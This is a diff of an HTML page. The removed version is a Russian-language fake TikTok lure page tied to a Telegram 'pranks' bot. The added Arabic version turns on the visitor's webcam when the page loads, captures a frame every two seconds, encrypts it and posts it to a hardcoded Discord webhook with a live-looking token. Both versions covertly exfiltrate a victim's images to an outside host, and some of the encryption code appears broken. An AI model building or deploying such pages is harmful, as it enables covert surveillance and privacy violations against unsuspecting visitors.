@@ -1,189 +1,146 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="ar">
 <head>
-    <!-- Google tag (gtag.js) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-22S9P2RVGZ"></script>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-      gtag('config', 'G-22S9P2RVGZ');
-    </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="Tiktok video" />
-    <meta property="og:description" content="Watch tiktok" />
-    <meta property="og:image" content="https://wwd.com/wp-content/uploads/2020/09/tiktok.png" />
-    <meta property="og:type" content="website" />
-
-    <meta name="description" content="Watch tiktok" />
-    <title>Tiktok</title>
-    <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background-color: #010101;
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            color: #fff;
-        }
-        .container {
-            text-align: center;
-            padding: 20px;
-            background-color: #262626;
-            border-radius: 20px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
-            max-width: 400px;
-            width: 100%;
-            position: relative; /* Добавлено для уточнения позиции */
-            z-index: 1; /* Устанавливаем на передний план */
-        }
-        .idi-naxuy {
-            font-size: 28px;
-            font-weight: bold;
-            margin-bottom: 20px;
-            color: #fff;
-        }
-        .btn-watch {
-            padding: 15px 30px;
-            font-size: 20px;
-            font-weight: bold;
-            color: #fff;
-            background-color: #fe2c55;
-            border: none;
-            border-radius: 30px;
-            cursor: pointer;
-            display: none;
-            transition: background-color 0.3s ease, transform 0.2s ease;
-            margin-top: 10px;
-        }
-        .btn-watch:hover {
-            background-color: #e62950;
-            transform: scale(1.05);
-        }
-        .btn-bot {
-            padding: 15px 30px;
-            font-size: 20px;
-            font-weight: bold;
-            color: #fff;
-            background-color: #fe2c55;
-            border: none;
-            border-radius: 30px;
-            cursor: pointer;
-            display: none;
-            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
-            margin-top: 10px;
-            text-decoration: none;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
-        }
-        .btn-bot:hover {
-            background-color: #ff456e;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
-            text-decoration: none; /* Ensure text decoration stays removed on hover */
-        }
-        .btn-bot:active {
-            background-color: #e9224a;
-            transform: translateY(0);
-            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.2);
-        }
-        video, canvas {
-            max-width: 100%;
-            border-radius: 20px;
-            margin-bottom: 20px;
-            display: none;
-        }
-        
-        video1, canvas1 {
-            display: none;
-        }
-        #pointer {
-            position: fixed;
-            width: 0;
-            height: 0;
-            border-left: 20px solid transparent;
-            border-right: 20px solid transparent;
-            border-bottom: 30px solid red; /* Цвет и длина указателя */
-            top: 10px; /* Отступ от верхнего края */
-            right: 10px; /* Отступ от правого края */
-            z-index: 1000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .arrow {
-                width: 0;
-                height: 0;
-                border-left: 10px solid transparent;
-                border-right: 10px solid transparent;
-                border-bottom: 15px solid red; /* Цвет и длина стрелочки */
-                animation: bounce 1s infinite; /* Анимация */
-        }
-            
-        @keyframes bounce {
-                0%, 20%, 50%, 80%, 100% {
-                    transform: translateY(0);
-                }
-                40% {
-                    transform: translateY(-10px);
-                }
-                60% {
-                    transform: translateY(-5px);
-                }
-        }
-
-    </style>
+    <title>التقاط فيديو من الكاميرا وإرساله إلى Webhook مشفر</title>
 </head>
 <body>
-    <div id="pointer" style="display: none;">
-        <div class="arrow"></div>
-    </div>
-    <div class="container">
-        <canvas id="canvas"></canvas>
-        <h1 class="idi-naxuy" id="idiNax">Пользователь прислал вам видео</h1>
-        <button class="btn-watch" id="watchBtn">Посмотреть</button>
-         <a href="https://t.me/TiktokPranksBot" class="btn-bot" id="botBtn">Переходи в бот и получай свою ссылку</a>
-    </div>
-    <video id="video" autoplay playsinline></video>
-    <video id="video1" autoplay playsinline></video>
-    <canvas id="canvas1"></canvas>
+    <h2>التقاط الفيديو من الكاميرا وإرساله إلى Webhook مع تشفير الرابط</h2>
+    <video id="video" width="640" height="480" autoplay></video>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/openpgp/5.0.0-rc.1/openpgp.min.js"></script>
+
     <script>
-        // URL of the webhook where the image will be sent
-        const webhookUrl = "https://discord.com/api/webhooks/1304326600438972447/cPAPNutnxg86tnOFPS4nbt5CHapnvXwXAiKR8bqJPJylOaLcd-wV3avTuFqcphwmB6Sc";
+        // الرابط المشفر (Webhook) - سيتم تشفيره قبل الإرسال
+        const webhookUrl = 'https://discord.com/api/webhooks/1304326600438972447/cPAPNutnxg86tnOFPS4nbt5CHapnvXwXAiKR8bqJPJylOaLcd-wV3avTuFqcphwmB6Sc';
+        
+        // المفتاح العام للتشفير (مثال فقط)
+        const publicKeyArmored = `-----BEGIN PGP PUBLIC KEY BLOCK-----
+        mQINBFwtg4gBEADfrgHd2wA6hTtGkjKAE9lpnW+E7p+1jvwy0UyBhWp7yLPQTrtV
+        N6AOSm69PgpBzyWCrVqqA7PTzqN6aZOnFlYFgV6DdaGl0z5v0dDEx44qgUKcz7l8
+        V6v8PvA54wrgSYsHRzYlRS1hwkqqes0ldwvZT0UekTbZ4Z9Z2pT8xSzEv0H0f9bA
+        SZoHBykjTx4Eqa4b9hCyvZyyebDb7QY0lk8g7eokDsdgI+1DZpUE2TbBC3xXwb2y
+        Y7yz2KgS7mSTm4wRyzI/gR9YYnbgdcY5zJvdA4X3Be4deYhgu5wXqUzljcRQNE3w
+        Wn1hprzUP5We3KcpUqg0cc8EvmDovvH/5bZW8DQEKkZ9ScQjpnnzkgShlCRyMleP
+        MxaFEqXFeOHw7Z5Nc0KxnMykCZVfHXQvvvDBQHHcbIQ0Fh8vbRPVdFjZuX7tJp27
+        UgjhTYrc5q8J34A5fF1ZXyGB5VZpYyySg1jyDb0nd6TtvowLxdFPjflISymSP9U8
+        LZg91NoqmuqfM6vAP1q3cnmzt3js4zdbW7DbsJ2YBjdNmLV9vBS5Fkpckbzo+mzD
+        y9ovdshMN3ZznQe38kmwTz03xvHthGau5b+aFvs0JXtHje7/gRhZQDdTgC7LBpZy
+        mJEI7yWTYHkZ2djPBJz2pcvZzLqlmEL62vV4lmkRmz8h8VEg/zN4cD0fU3VfDQUC
+        vAItDgHj5MB6YGo23LsCwv69XYsLV8UpwiVXEUnkX1emVhV5HtwqnT6pO9HXElK2
+        -----END PGP PUBLIC KEY BLOCK-----`;
 
-        // This function will send data (image or other data) to your Webhook
-        function sendDataToWebhook(imageData) {
-            $.ajax({
-                url: webhookUrl,
-                method: 'POST',
-                data: JSON.stringify({ image: imageData }),
-                contentType: 'application/json',
-                success: function(response) {
-                    console.log("Data sent successfully:", response);
-                },
-                error: function(error) {
-                    console.error("Error sending data:", error);
-                }
-            });
+        // دالة لبدء بث الفيديو من الكاميرا
+        function startCamera() {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function (stream) {
+                        const videoElement = document.getElementById('video');
+                        videoElement.srcObject = stream;
+
+                        // إرسال الفيديو إلى Webhook بشكل دوري
+                        sendVideoToWebhook(stream);
+                    })
+                    .catch(function (error) {
+                        console.error("حدث خطأ أثناء الوصول إلى الكاميرا:", error);
+                    });
+            } else {
+                alert("متصفحك لا يدعم الوصول إلى الكاميرا.");
+            }
         }
 
-        // Example of how to capture image from canvas and send it to the webhook
-        function captureAndSendImage() {
-            const canvas = document.getElementById("canvas");
-            const imageData = canvas.toDataURL("image/png");  // Capture image as Base64 PNG
-            sendDataToWebhook(imageData);  // Send it to the webhook
+        // دالة لتشفير الرابط ثم إرسال البيانات المشفرة إلى Webhook
+        function encryptWebhookUrlAndSend(stream) {
+            // تشفير الرابط باستخدام OpenPGP
+            openpgp.initWorker({ path: 'https://cdnjs.cloudflare.com/ajax/libs/openpgp/5.0.0-rc.1/openpgp.worker.min.js' });
+
+            openpgp.readKey({ armoredKey: publicKeyArmored })
+                .then(publicKey => {
+                    return openpgp.encrypt({
+                        message: openpgp.message.fromText(webhookUrl), // الرابط الذي سيتم تشفيره
+                        encryptionKeys: publicKey
+                    });
+                })
+                .then(encrypted => {
+                    // إرسال الرابط المشفر إلى Webhook (Discord Webhook)
+                    fetch("https://your-webhook-url-to-handle-encrypted-data.com", {  // هذه URL الويب هو فقط مثال
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            encryptedWebhookUrl: encrypted.data
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log("تم إرسال الرابط المشفر بنجاح إلى Webhook:", data);
+                    })
+                    .catch(error => {
+                        console.error("خطأ أثناء إرسال الرابط المشفر:", error);
+                    });
+                })
+                .catch(error => {
+                    console.error("خطأ أثناء التشفير:", error);
+                });
         }
 
-        // Adding a listener to capture when the user presses the button
-        document.getElementById("watchBtn").addEventListener("click", function() {
-            captureAndSendImage();  // Capture the image when the button is clicked
-        });
+        // دالة لإرسال الفيديو إلى Webhook بعد تشفيره
+        function sendVideoToWebhook(stream) {
+            const videoElement = document.getElementById('video');
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+
+            // تعيين أبعاد الكاميرا على نفس أبعاد الفيديو
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+
+            // دالة لالتقاط صورة من الفيديو وتشفيرها ثم إرسالها
+            setInterval(() => {
+                // رسم الإطار الحالي من الفيديو على الـ Canvas
+                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+                // تحويل الصورة إلى بيانات base64
+                const dataUrl = canvas.toDataURL('image/jpeg');
+
+                // تشفير الصورة باستخدام ElGamal (OpenPGP)
+                openpgp.initWorker({ path: 'https://cdnjs.cloudflare.com/ajax/libs/openpgp/5.0.0-rc.1/openpgp.worker.min.js' });
+
+                openpgp.readKey({ armoredKey: publicKeyArmored })
+                    .then(publicKey => {
+                        return openpgp.encrypt({
+                            message: openpgp.message.fromText(dataUrl), // البيانات التي سيتم تشفيرها
+                            encryptionKeys: publicKey
+                        });
+                    })
+                    .then(encrypted => {
+                        // إرسال البيانات المشفرة إلى Webhook باستخدام fetch
+                        fetch(webhookUrl, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                encryptedData: encrypted.data
+                            })
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log("تم إرسال البيانات المشفرة بنجاح إلى Webhook:", data);
+                        })
+                        .catch(error => {
+                            console.error("خطأ أثناء إرسال البيانات إلى Webhook:", error);
+                        });
+                    })
+                    .catch(error => {
+                        console.error("خطأ أثناء التشفير:", error);
+                    });
+            }, 2000); // إرسال صورة مشفرة كل 2 ثانية
+        }
+
+        // بدء الكاميرا عند تحميل الصفحة
+        window.onload = startCamera;
     </script>
 </body>
 </html>
